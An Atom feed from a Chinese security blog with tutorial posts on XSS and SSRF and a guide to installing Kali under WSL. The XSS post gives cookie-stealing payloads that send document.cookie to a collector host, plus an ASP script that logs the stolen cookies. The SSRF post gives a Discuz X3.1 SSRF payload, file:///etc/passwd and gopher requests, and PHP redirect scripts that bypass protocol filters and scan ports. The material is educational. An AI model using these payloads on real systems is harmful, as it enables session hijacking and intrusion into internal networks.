<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Goudan&#39;s blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://goudanjun.vip/"/>
  <updated>2021-01-10T14:44:14.022Z</updated>
  <id>http://goudanjun.vip/</id>
  
  <author>
    <name>狗蛋菌</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>XSS漏洞总结及实战</title>
    <link href="http://goudanjun.vip/2021/01/10/XSS%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%E5%8F%8A%E5%AE%9E%E6%88%98.html/"/>
    <id>http://goudanjun.vip/2021/01/10/XSS漏洞总结及实战.html/</id>
    <published>2021-01-10T03:07:53.000Z</published>
    <updated>2021-01-10T14:44:14.022Z</updated>
    
    <content type="html"><![CDATA[<h2 id="xss攻击原理"><a href="#xss攻击原理" class="headerlink" title="xss攻击原理"></a><strong>xss攻击原理</strong></h2><p>​    xxs全称（CrossSite Scripting）跨站脚本攻击，是常见的Web应用程序安全漏洞之一，xss指攻击者在网页中嵌入客户端脚本，通常是JavaScript编写的危险代码，当用户使用浏览器浏览网页时，脚本就会在用户的浏览器上执行，从而达到攻击者的各种目的。</p><a id="more"></a><p>​    xss攻击的最终目的是在网页中嵌入客户端恶意脚本代码，最常用的攻击代码是JavaScript语言，但也会使用其他互联网客户端脚本代码，例如：ActionScript，VBscript。而如今的互联网客户端脚本代码基本是基于JavaScript，所以要想深入研究xss，必须精通JavaScript。JavaScript可以用来获取用户的Cooike，改变网页的内容，弹出窗口那么存在xss漏洞的网站，xss就可以用来盗取Cooike，黑掉页面，导航到恶意网站！甚至可以完全监控你的键盘操作，模仿windows注销界面，诱导你输入开机密码！而攻击者需要做的仅仅是向你的代码中注入JavaScript代码！</p><h2 id="xss的危害"><a href="#xss的危害" class="headerlink" title="xss的危害"></a><strong>xss的危害</strong></h2><ol><li>网络钓鱼，包括盗取各类用户账号</li><li>窃取用户Cooikes，利用管理员身份进一步对网站执行操作：</li><li>劫持会话，从而执行任意的操作，例如非法转账，强制发表日志，发送电子邮件：</li><li>强制弹广告，刷流量等（黑帽SEO）</li><li>海量客户端攻击（比如DDOS）</li><li>获取客户端信息，比如IP地址，开放端口，网页浏览历史；</li><li>传播跨站脚本蠕虫</li><li>结合其他漏洞，如CSRF漏洞</li></ol><h2 id="xss攻击分类"><a href="#xss攻击分类" class="headerlink" title="xss攻击分类"></a><strong>xss攻击分类</strong></h2><p>主要分为三大类：反射型，DOM型，储存型</p><p><strong>反射型</strong>：（服务器端 ）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$username=$_GET[<span class="string">'username'</span>];</span><br><span class="line"><span class="keyword">echo</span> $username;</span><br><span class="line"><span class="meta">?&gt;</span>    </span><br><span class="line"></span><br><span class="line"><span class="comment">#在这段代码中程序接受username值，并且输出，如果提交xss.php? username=zhangsan,那么程序并没有进行xss代码过滤，最终造成了反射型xss漏洞</span></span><br></pre></td></tr></table></figure><p><strong>DOM型</strong>：（在客户端上进行攻击）</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">var urls=document.URL;//获取URL</span><br><span class="line">var index=document.URL.indexOf("url=")+4；</span><br><span class="line">var par = urls.substring(index);</span><br><span class="line">document.write(decodeURI(par));//输入获取内容</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--上面代码的意思是获取URL中的urls参数的值，并且输出，如果输入http://host/domxss.php?url=&lt;script&gt;alert(/xss/)&lt;/script&gt;就可触发xss攻击的发生--&gt;</span></span><br></pre></td></tr></table></figure><p><strong>储存型</strong>：</p><p>与反射型相比，唯一的区别就是xss代码被存入了数据库中，在下次浏览时，又被读取出来</p><p>相对反射型，一般来说储存型的危害更大</p><p>真实案例：wooyun-2014-83651 凤凰网储存xss</p><h2 id="xss测试技巧"><a href="#xss测试技巧" class="headerlink" title="xss测试技巧"></a><strong>xss测试技巧</strong></h2><p><strong>工具检查</strong>: APPSCAN,AWVS,BurpSuit等综合型的扫描工具，但不如专门的xss检测工具（XSSER、XSSF、NoXss）效率高，不能检测储存型的xss漏洞</p><p><strong>手工测试</strong>：</p><p>常用的xss攻击脚本：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert("xss test!")<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>document.write(document.cookie)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>document.location='http://localhost/xss_savecookie.asp?xcookie='+document.cookie<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:alert(</span>'<span class="attr">test</span>')&gt;</span>adfasdfasdf<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:document.write(document.cookie)</span>&gt;</span>adfasdfasdf<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:document.location</span>=<span class="string">'http://192.168.24.250:83/xss_savecookie.asp?xcookie='</span>+<span class="attr">document.cookie</span>&gt;</span>点击察看详情<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line">http://localhost/xss_savecookie.asp?xcookie=ASPSESSIONIDAARDBTAQ=HGOPGOPCEKEPHHDEBPHJPGLB;%20gbtoyAtBD=4;%20gbtoyTime=2012%2D6%2D11+23%3A33%3A29;%20gbtoy=pass=123456&amp;user=linhai</span><br><span class="line"></span><br><span class="line">http://192.168.24.250:81/cookiesave/XSS_savecookie.asp    &amp;lt  <span class="tag">&lt;&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:document.location</span>=<span class="string">'http://192.168.24.250:81/cookiesave/XSS_savecookie.asp?xcookie='</span>+<span class="attr">document.cookie</span>&gt;</span>adfasdfasdf<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>情景一:可得知输出位置</p><p>使用手工测试web应用程序是否存在xss漏洞时，最重要的是考虑哪里有输入，输入的数据在哪里进行输出*。</p><p>在进行手工测试xss时，一定要选择有特殊意义的字符，这样可以快速检测是否存在xss，比如说测试某输入框是否存在xss漏洞，不要直接输入xss跨站语句进行测试，一步一步来更便于测试和分析。</p><p>比如：输入一些敏感字符，例如：<strong>&lt;,&gt;,’,”,(,)</strong> 等，在提交请求后去查看html源代码，看这些输入的字符是否被转义。</p><p>在输入这些字符的时候，很有可能程序已经做了过滤，那么你再寻找就不那么容易了，只是可以输入“<strong>xsser&lt;&gt;”‘&amp;</strong>”这样的字符串，然后在查找源代码的时候直接查找xsser来去定位，避免被过滤掉之后就找不到输出的位置了。</p><p> 情景二：无法得知输出位置</p><p>非常多的web应用程序源代码是不对外开放的，这时进行xss时就有可能无法得知输入数据在哪显示、</p><p>对于这种情况通常采用万能输入：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">"/&gt;<span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p> 来进行测试</p><p>有些情况手工检测漏洞的效率比全自动检测软件更快，因为测试人员通过经验可以快速发现输入点，这些是扫描器无法比拟的。</p><p>另外一些xss漏洞也不仅仅是直接注入到HTML，可能数据中才触发，比如再上传文件时修改文件名为</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">"<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(/xss/)<span class="tag">&lt;/<span class="name">script</span>&gt;</span>"</span><br></pre></td></tr></table></figure><p>那么程序在读文件名显示在html文档中，也会触发xss跨站漏洞的。</p><p>有输入的地方就可能存在着风险，如果连输入都没有，xss就不必检测了，包括其他安全漏洞</p><h2 id="xss实战"><a href="#xss实战" class="headerlink" title="xss实战"></a>xss实战</h2><h3 id="0x00-XSS会话劫持"><a href="#0x00-XSS会话劫持" class="headerlink" title="0x00 XSS会话劫持"></a><strong>0x00 XSS会话劫持</strong></h3><p><strong>盗取cookie：</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(doucument.cookie)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/01/10/gacRS42PWVYAsIG.jpg" alt="img"></p><p><strong>会话劫持：</strong></p><p>劫持的cookie代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>document.location='http://192.168.0.25:8007/XSS_savecookie.asp?xcookie='+document.cookie<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>XSS_savecookie.asp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;font size=&quot;4&quot; color=&quot;#FF0000&quot;&gt;&lt;b&gt;自动接收跨站脚本截取到的Cookie信息，保存于cookie_xss.txt文件中。&lt;/b&gt; &lt;/font&gt;</span><br><span class="line">&lt;%</span><br><span class="line">dim XCookie,StrCookieText,strLogFile,XUser</span><br><span class="line">strLogFile=&quot;cookie_xss.txt&quot;</span><br><span class="line">XCookie=request(&quot;xcookie&quot;)</span><br><span class="line">XUser=request(&quot;user&quot;)</span><br><span class="line">if XCookie=&quot;&quot;  then</span><br><span class="line">  response.write &quot;cookie信息为空！&quot;</span><br><span class="line">  response.end</span><br><span class="line">End If</span><br><span class="line">StrCookieText=StrCookieText&amp;&quot;Cookie值为：----&quot;&amp;XCookie&amp;&quot; user=&quot;&amp;XUser&amp;&quot;----&quot;&amp;request.servervariables(&quot;REMOTE_HOST&quot;)</span><br><span class="line">StrCookieText=StrCookieText&amp;&quot; &quot;&amp;date&amp;&quot; &quot;&amp;time</span><br><span class="line"></span><br><span class="line">set f=Server.CreateObject(&quot;scripting.filesystemobject&quot;)</span><br><span class="line">set ff=f.opentextfile(server.mappath(&quot;.&quot;)&amp;&quot;\&quot;&amp;strLogFile,8,true,0)</span><br><span class="line">ff.writeline(chr(13)+chr(10)&amp;StrCookieText)</span><br><span class="line">ff.close</span><br><span class="line">set ff=nothing</span><br><span class="line">set f=nothing</span><br><span class="line">                      </span><br><span class="line">response.write &quot;&lt;br&gt;&lt;br&gt;提示：此脚本仅限测试!&quot;</span><br><span class="line"></span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/01/10/BJfAohunNzHQjXx.png" alt="微信截图_20210110113640"></p><h2 id="xss防御策略"><a href="#xss防御策略" class="headerlink" title="xss防御策略"></a>xss防御策略</h2><h2 id="★注"><a href="#★注" class="headerlink" title="★注"></a>★注</h2><h3 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a><strong>同源策略</strong></h3><p>是一种约定，他是浏览器最核心也是最基本的安全功能，可以说web是建立在同源策略的基础上的，浏览器只是针对同源策略的一种实现</p><p>同源策略的四大要素：</p><p>1，host（域名或IP地址，如果是IP地址则看作一个根域名）</p><p>2，子域名</p><p>3，端口</p><p>4，协议</p><p>对于浏览器来说受同源策略约束的有DOM，Cookie，XMLHttprequest，以及浏览器加载的第三方插件也有各自的同源策略。例如：flash，java applet，silverlight，coogle gears等。</p><p>不受约束的有：在浏览器中，对于标签</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="xml">,<span class="tag">&lt;<span class="name">img</span>&gt;</span>,<span class="tag">&lt;<span class="name">iframe</span>&gt;</span>,<span class="tag">&lt;<span class="name">link</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>等标签都可以跨域加载资源，而不受同源策略的限制。这些带有”src“属性的标签每次加载的时候，实际上是由浏览器发起的一个get请求。</p><h3 id="XSS平台"><a href="#XSS平台" class="headerlink" title="XSS平台"></a><strong>XSS平台</strong></h3><p>BeEF,XSS Proxy，Backframe，国内的XXSER.ME(XSS Platfrom)也是比较优秀的XSS漏洞利用框架</p><p>其实框架是一组”javascript“工具集合，比如实现键盘记录，点击劫持等</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;xss攻击原理&quot;&gt;&lt;a href=&quot;#xss攻击原理&quot; class=&quot;headerlink&quot; title=&quot;xss攻击原理&quot;&gt;&lt;/a&gt;&lt;strong&gt;xss攻击原理&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;​    xxs全称（CrossSite Scripting）跨站脚本攻击，是常见的Web应用程序安全漏洞之一，xss指攻击者在网页中嵌入客户端脚本，通常是JavaScript编写的危险代码，当用户使用浏览器浏览网页时，脚本就会在用户的浏览器上执行，从而达到攻击者的各种目的。&lt;/p&gt;
    
    </summary>
    
    
      <category term="xss" scheme="http://goudanjun.vip/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>SSRF漏洞总结及实战</title>
    <link href="http://goudanjun.vip/2021/01/09/ssrf%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%E5%8F%8A%E5%AE%9E%E6%88%98.html/"/>
    <id>http://goudanjun.vip/2021/01/09/ssrf漏洞总结及实战.html/</id>
    <published>2021-01-09T04:47:28.000Z</published>
    <updated>2021-01-10T03:25:33.568Z</updated>
    
    <content type="html"><![CDATA[<h2 id="SSRF攻击原理"><a href="#SSRF攻击原理" class="headerlink" title="SSRF攻击原理"></a><strong>SSRF攻击原理</strong></h2><p>SSRF（Server-Side Request Forgery，服务器端请求伪造）是一种由攻击者构造请求，利用服务器端发起的安全漏洞。一般情况下，SSRF攻击的目标是外网无法访问的内部系统（正因为请求是由服务器端发起的，所以服务器能请求到与自身相连而外网隔离的内部系统）。</p><a id="more"></a><h3 id="Example："><a href="#Example：" class="headerlink" title="Example："></a>Example：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /index.php?url=http://google.com/ HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: example.com</span><br></pre></td></tr></table></figure><p>在这里，<a href="http://example.com从它的服务器获取http://google.com" target="_blank" rel="noopener">http://example.com从它的服务器获取http://google.com</a></p><p><img src="https://i.loli.net/2021/01/09/BXCedG2Dlz6EaKt.jpg" alt="v2-e92913401482f654b988eab6e46c9c99_720w"></p><h2 id="SSRF的类型"><a href="#SSRF的类型" class="headerlink" title="SSRF的类型"></a>SSRF的类型</h2><ol><li><p>显示攻击者的响应（Basic）</p></li><li><p>不显示响应（Blind）</p></li></ol><h2 id="什么地方最容易出现SSRF"><a href="#什么地方最容易出现SSRF" class="headerlink" title="什么地方最容易出现SSRF"></a>什么地方最容易出现SSRF</h2><ol><li>云服务器商。(各种网站数据库操作)</li><li>有远程图片加载的地方。(编辑器之类的有远程图片加载啊)</li><li>网站采集、网页抓取的地方。(很多网站会有新闻采集输入url然后一键采集)</li><li>头像的地方。(某易就喜欢远程加载头像，例如:<a href="http://www.xxxx.com/image?url=http://www.image.com/1.jpg" target="_blank" rel="noopener">http://www.xxxx.com/image?url=http://www.image.com/1.jpg</a>)</li><li>最后一个一切要你输入网址的地方和可以输入ip的都放，都是ssrf的天下。</li></ol><h2 id="SSRF漏洞的危害"><a href="#SSRF漏洞的危害" class="headerlink" title="SSRF漏洞的危害"></a><strong>SSRF</strong>漏洞的危害</h2><ol><li>对服务器所在的内网进行端口扫描，获取一些服务的banner信息等</li><li>攻击运行在内网或者本地的应用程序</li><li>对内网WEB应用进行指纹识别，通过访问默认文件实现（Readme等文件）</li><li>攻击内外网的WEB应用，主要是GET就可以实现的攻击（比如Struts2，SQL注入等）</li><li>下载内网资源（利用file协议读取本地文件等）</li><li>利用Redis未授权访问，HTTP CRLF注入达到getshell</li><li>wooyun峰会猪猪侠的ppt</li><li>进行跳板</li><li>无视cdn</li></ol><h2 id="SSRF神器Curl的使用"><a href="#SSRF神器Curl的使用" class="headerlink" title="SSRF神器Curl的使用"></a><strong>SSRF神器Curl的使用</strong></h2><p>查看curl支持的协议列表 #curl–config –protocols</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#使用curl读取文件</span></span><br><span class="line">curl -v <span class="string">"file:///etc/passwd"</span></span><br><span class="line"><span class="comment">#使用ftp协议</span></span><br><span class="line">curl -v <span class="string">"ftp://127.0.0.1:6666/info"</span></span><br><span class="line"><span class="comment">#使用dict协议</span></span><br><span class="line">curl -v <span class="string">"dict://127.0.0.1:6666/info"</span></span><br><span class="line"><span class="comment">#使用gopher协议</span></span><br><span class="line">curl -v <span class="string">"gopher://127.0.0.1:6666/_info"</span></span><br></pre></td></tr></table></figure><h2 id="最常用的跳转绕过"><a href="#最常用的跳转绕过" class="headerlink" title="最常用的跳转绕过"></a>最常用的跳转绕过</h2><p>一些服务器可能限定了只能使用http和https，这样就可以通过header跳转绕过</p><p><img src="https://i.loli.net/2021/01/09/pd5fo1PDSFkNVr7.jpg" alt="v2-71bcbdbcb44534474a386c2f4479c8b2_720w"></p><h2 id="Python-SSRF实现端口扫描"><a href="#Python-SSRF实现端口扫描" class="headerlink" title="Python+SSRF实现端口扫描"></a><strong>Python+SSRF实现端口扫描</strong></h2><p>简单的端口扫描</p><p><img src="https://i.loli.net/2021/01/09/RJFnikj9Apb2ON5.jpg" alt="2"></p><p>同时观察Wireshark整个扫描流程</p><p><img src="https://i.loli.net/2021/01/09/6IaAdCSbDcMF3Ko.jpg" alt="3"></p><p>代码实现：</p><p><img src="https://i.loli.net/2021/01/09/AHjnXzGoZQvrxSt.jpg" alt="4"></p><p>验证本地是否开启了相应的端口</p><p><img src="https://i.loli.net/2021/01/09/mu8nMTFzNafhZPs.jpg" alt="5"></p><p>Python代码编写的思路：</p><p>端口存在连接会一直在连接，连接时间会很长。</p><p><img src="https://i.loli.net/2021/01/09/rRWweQIZ6nkbhsH.jpg" alt="6"></p><p>端口不存在的连接会被立马刷新</p><p><img src="https://i.loli.net/2021/01/09/TsdaMScUHOzGLmn.jpg" alt="7"></p><h2 id="SSRF实战"><a href="#SSRF实战" class="headerlink" title="SSRF实战"></a>SSRF实战</h2><p>环境：win10（Discuz! X3.1），kali（nc监听；IP：192.168.239.134）</p><p>Discuz下载地址：[Discuz!]:<a href="https://www.discuz.net/thread-3457145-1-1.html" target="_blank" rel="noopener">https://www.discuz.net/thread-3457145-1-1.html</a></p><p><img src="https://i.loli.net/2021/01/09/PWD5LF8dTyg9uia.png" alt="1"></p><ol><li><h3 id="在kali上监听-6666-端口"><a href="#在kali上监听-6666-端口" class="headerlink" title="在kali上监听 6666 端口"></a>在kali上监听 6666 端口</h3><p><img src="https://i.loli.net/2021/01/09/VDqtLxAl2iFd9gC.png" alt="2"></p><p><img src="https://i.loli.net/2021/01/09/uFWw4Uc2okJaIlv.png" alt="微信截图_20210109192239"></p></li><li><h3 id="利用Discuz-3-1的ssrf漏洞进行请求访问"><a href="#利用Discuz-3-1的ssrf漏洞进行请求访问" class="headerlink" title="利用Discuz 3.1的ssrf漏洞进行请求访问"></a>利用Discuz 3.1的ssrf漏洞进行请求访问</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/discuz/forum.php</span><br><span class="line">?mod=ajax</span><br><span class="line">&amp;action=downremoteimg</span><br><span class="line">&amp;message=[img]http://192.168.3.26:6666/?data=hello.jpg[/img]</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/01/09/BhK9NzIPZpf8Xie.png" alt="3"></p></li><li><h3 id="可以看出在kali上监听到了本机发来的get请求"><a href="#可以看出在kali上监听到了本机发来的get请求" class="headerlink" title="可以看出在kali上监听到了本机发来的get请求"></a>可以看出在kali上监听到了本机发来的get请求</h3><p><img src="https://i.loli.net/2021/01/09/2I4xhV5Qgudn6PF.png" alt="4"></p><h3 id="绕过header限制"><a href="#绕过header限制" class="headerlink" title="绕过header限制"></a>绕过header限制</h3><p>很多网站不允许使用ftp dict gopher协议去请求的，所以需要php函数 header来绕过</p><p>在公网的服务器上建立一个 dict.php 文件，写入如下内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> header(<span class="string">"location: dict://192.168.136.133:6666/info"</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/01/09/fJyFN4GwZA78SR1.png" alt="微信截图_20210109202024"></p><p>在discuz中构造如下payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/discuz/forum.php</span><br><span class="line">?mod=ajax</span><br><span class="line">&amp;action=downremoteimg</span><br><span class="line">&amp;message=[img]http://192.168.239.137/dict.php?data=hello.jpg[/img]</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/01/09/ZOfyAEYqIhPFxsi.png" alt="微信截图_20210109202101"></p><p>回到kali中查看结果，成功接收到了请求info，成功利用header绕过限制，其他协议的绕过，改我们创建的php文件中的协议名称即可</p><p><img src="https://i.loli.net/2021/01/09/H4JgAXPjwrC7zh2.png" alt="微信截图_20210109202140"></p></li></ol><h3 id="探测端口"><a href="#探测端口" class="headerlink" title="探测端口"></a>探测端口</h3><p>在公网服务器上创建 port.php 内容如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$ip = $_GET[<span class="string">'ip'</span>]; </span><br><span class="line">$port = $_GET[<span class="string">'port'</span>]; </span><br><span class="line">$scheme = $_GET[<span class="string">'s'</span>]; </span><br><span class="line">$data = $_GET[<span class="string">'data'</span>]; </span><br><span class="line">header(<span class="string">"Location: $scheme://$ip:$port:$data"</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>构造如下payload</p><p><img src="https://i.loli.net/2021/01/09/v59Yh8l1fD4RuPS.png" alt="微信截图_20210109202539"></p><p>如果加载的时间很长，说明该端口是开放的。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;SSRF攻击原理&quot;&gt;&lt;a href=&quot;#SSRF攻击原理&quot; class=&quot;headerlink&quot; title=&quot;SSRF攻击原理&quot;&gt;&lt;/a&gt;&lt;strong&gt;SSRF攻击原理&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;SSRF（Server-Side Request Forgery，服务器端请求伪造）是一种由攻击者构造请求，利用服务器端发起的安全漏洞。一般情况下，SSRF攻击的目标是外网无法访问的内部系统（正因为请求是由服务器端发起的，所以服务器能请求到与自身相连而外网隔离的内部系统）。&lt;/p&gt;
    
    </summary>
    
    
      <category term="ssrf" scheme="http://goudanjun.vip/tags/ssrf/"/>
    
  </entry>
  
  <entry>
    <title>在win10上安装kali子系统</title>
    <link href="http://goudanjun.vip/2019/07/31/%E5%9C%A8win10%E4%B8%8A%E5%AE%89%E8%A3%85kali%E5%AD%90%E7%B3%BB%E7%BB%9F.html/"/>
    <id>http://goudanjun.vip/2019/07/31/在win10上安装kali子系统.html/</id>
    <published>2019-07-31T12:32:40.000Z</published>
    <updated>2021-01-07T15:04:28.803Z</updated>
    
    <content type="html"><![CDATA[<h2 id="打开windows开发人员模式"><a href="#打开windows开发人员模式" class="headerlink" title="打开windows开发人员模式"></a>打开windows开发人员模式</h2><a id="more"></a><p><img src="https://i.loli.net/2021/01/07/ZmgqurUfKR7WDTL.png" alt="009234530215"></p><p><img src="https://i.loli.net/2021/01/07/MvQfoUlqPHk67Xg.png" alt="2"></p><h2 id="打开windows子系统功能"><a href="#打开windows子系统功能" class="headerlink" title="打开windows子系统功能"></a>打开windows子系统功能</h2><p><img src="https://i.loli.net/2021/01/07/tYrgvK4paqlo2ch.png" alt="img"></p><h2 id="安装子系统，在windows商店搜索wsl"><a href="#安装子系统，在windows商店搜索wsl" class="headerlink" title="安装子系统，在windows商店搜索wsl"></a>安装子系统，在windows商店搜索wsl</h2><p><img src="https://i.loli.net/2021/01/07/YGAxrdcQBeTFu9S.png" alt="img"></p><p><img src="https://i.loli.net/2021/01/07/eREJ2I81VziHKZl.png" alt="img"></p><p>安装</p><p>安装完成后设置用户名为kali，设置密码</p><p>至此命令行kali安装完成</p><h2 id="安装图形化界面"><a href="#安装图形化界面" class="headerlink" title="安装图形化界面"></a>安装图形化界面</h2><p>安装vim</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install vim</span><br></pre></td></tr></table></figure><p>更换kali源</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/apt/sources.list</span><br></pre></td></tr></table></figure><p>添加下边的两个源：</p><p>#中科大</p><blockquote><p>deb <a href="https://mirrors.ustc.edu.cn/kali" target="_blank" rel="noopener">https://mirrors.ustc.edu.cn/kali</a> kali-rolling main non-free contrib </p><p>deb-src <a href="https://mirrors.ustc.edu.cn/kali" target="_blank" rel="noopener">https://mirrors.ustc.edu.cn/kali</a> kali-rolling main non-free contrib</p></blockquote><p>保存</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update <span class="comment">#更新源 </span></span><br><span class="line"></span><br><span class="line">wget https://kali.sh/xfce4.sh sudo sh xfce4.sh <span class="comment">#安装桌面环境 </span></span><br><span class="line"></span><br><span class="line">sudo /etc/init.d/xrdp start <span class="comment">#开启桌面</span></span><br></pre></td></tr></table></figure><p>#这时候可以使用 windows 的远程桌面连接，输入 127.0.0.1：3390</p><p>#当不想使用桌面环境时，点击 logout 后在命令行执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /etc/init.d/xrdp stop</span><br></pre></td></tr></table></figure><h2 id="安装kali-工具"><a href="#安装kali-工具" class="headerlink" title="安装kali 工具"></a>安装kali 工具</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#安装python</span></span><br><span class="line">sudo apt-get install python</span><br><span class="line"><span class="comment">#安装gnupg</span></span><br><span class="line">sudo apt-get install gnupg</span><br><span class="line"><span class="comment">#安装git</span></span><br><span class="line">sudo apt-get install git</span><br></pre></td></tr></table></figure><p>下载工具包脚本，并执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/LionSec/katoolin.git &amp;&amp; sudo cp katoolin/katoolin.py /usr/bin/katoolin </span><br><span class="line"></span><br><span class="line">chmod +x /usr/bin/katoolin </span><br><span class="line"></span><br><span class="line">sudo katoolin</span><br><span class="line"></span><br><span 